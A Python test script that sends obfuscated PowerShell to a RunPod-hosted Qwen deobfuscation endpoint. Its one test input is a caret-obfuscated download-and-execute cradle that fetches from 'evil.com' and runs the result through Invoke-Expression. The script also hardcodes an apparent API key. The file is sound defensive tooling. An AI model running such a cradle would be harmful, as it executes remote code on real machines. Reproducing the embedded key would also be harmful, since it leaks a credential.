"""
Test RunPod Qwen deobfuscation endpoint.
Uses the same payload format as api/services/runpod_client.py.

Usage:
    python testrunpod.py
    python testrunpod.py "your obfuscated command here"
"""
import sys
import time
import requests

API_KEY = "rpa_CEZD19DT67ULFFYY7US0CE4HLP7QOWVANB8USDDKwi7uls"
ENDPOINT_ID = "kz9psda24vpjzs"
BASE_URL = f"https://api.runpod.ai/v2/{ENDPOINT_ID}"

HEADERS = {
    "Authorization": f"Bearer {API_KEY}",
    "Content-Type": "application/json",
}

SYSTEM_PROMPT = (
    "You are a PowerShell deobfuscation expert. Analyze the given PowerShell command "
    "and resolve ALL obfuscation techniques including: tick marks (`), format string "
    "operators (-f), string concatenation (+), case randomization, variable aliasing, "
    "char codes ([char]0x..., [char]65), Base64 encoding, string reversals, "
    "ScriptBlock invocation, IEX/Invoke-Expression wrappers, and any other technique.\n\n"
    "Output your response in this EXACT format — nothing else:\n"
    "DEOBFUSCATED:\n"
    "<fully cleaned command>\n\n"
    "TECHNIQUES: <comma-separated list, e.g. 'tick insertion, format string, Base64',"
    " or 'none' if no obfuscation was detected>"
)

TEST_COMMANDS = [
    "p^o^w^e^r^s^h^e^l^l -^c I^n^v^o^k^e^-^E^x^p^r^e^s^s^i^o^n (^N^e^w-^O^b^j^e^c^t N^e^t.^W^e^b^C^l^i^e^n^t).^D^o^w^n^l^o^a^d^S^t^r^i^n^g('http://evil.com')"
]


def submit_job(command: str) -> str:
    payload = {
        "input": {
            "messages": [
                {"role": "system", "content": SYSTEM_PROMPT},
                {"role": "user", "content": command},
            ],
            "sampling_params": {
                "max_tokens": 4096,
                "temperature": 0,
            },
        }
    }
    resp = requests.post(f"{BASE_URL}/run", headers=HEADERS, json=payload, timeout=30)
    resp.raise_for_status()
    data = resp.json()
    job_id = data.get("id")
    if not job_id:
        raise RuntimeError(f"No job ID returned: {data}")
    return job_id


def poll_job(job_id: str, max_wait: int = 120) -> dict:
    deadline = time.time() + max_wait
    while time.time() < deadline:
        time.sleep(2.5)
        resp = requests.get(f"{BASE_URL}/status/{job_id}", headers=HEADERS, timeout=15)
        resp.raise_for_status()
        data = resp.json()
        status = data.get("status")
        print(f"  status: {status}")
        if status == "COMPLETED":
            return data
        if status in ("FAILED", "CANCELLED", "TIMED_OUT"):
            raise RuntimeError(f"Job ended with status: {status}\n{data}")
    raise TimeoutError(f"Job {job_id} did not complete within {max_wait}s")


def extract_text(output) -> str:
    if output is None:
        return "(no output)"
    if isinstance(output, list):
        for item in output:
            if isinstance(item, dict):
                result = extract_text(item)
                if result:
                    return result
        return "\n".join(str(i) for i in output)
    if isinstance(output, dict):
        choices = output.get("choices")
        if choices:
            first = choices[0]
            msg = first.get("message")
            if isinstance(msg, dict):
                return msg.get("content", "")
            tokens = first.get("tokens")
            if tokens and isinstance(tokens, list):
                return "".join(tokens)
            return first.get("text", "")
        return output.get("text") or output.get("content") or str(output)
    return str(output)


def run_test(command: str):
    print(f"\n{'='*60}")
    print(f"INPUT:\n  {command}")
    print(f"{'='*60}")

    print("Submitting job...")
    job_id = submit_job(command)
    print(f"Job ID: {job_id}")

    print("Polling for result...")
    result = poll_job(job_id)

    text = extract_text(result.get("output"))
    print(f"\nRAW OUTPUT:\n{text}")


if __name__ == "__main__":
    if len(sys.argv) > 1:
        run_test(" ".join(sys.argv[1:]))
    else:
        print(f"Running {len(TEST_COMMANDS)} test command(s)...\n")
        for cmd in TEST_COMMANDS:
            try:
                run_test(cmd)
            except Exception as e:
                print(f"ERROR: {e}")
        print("\nDone.")
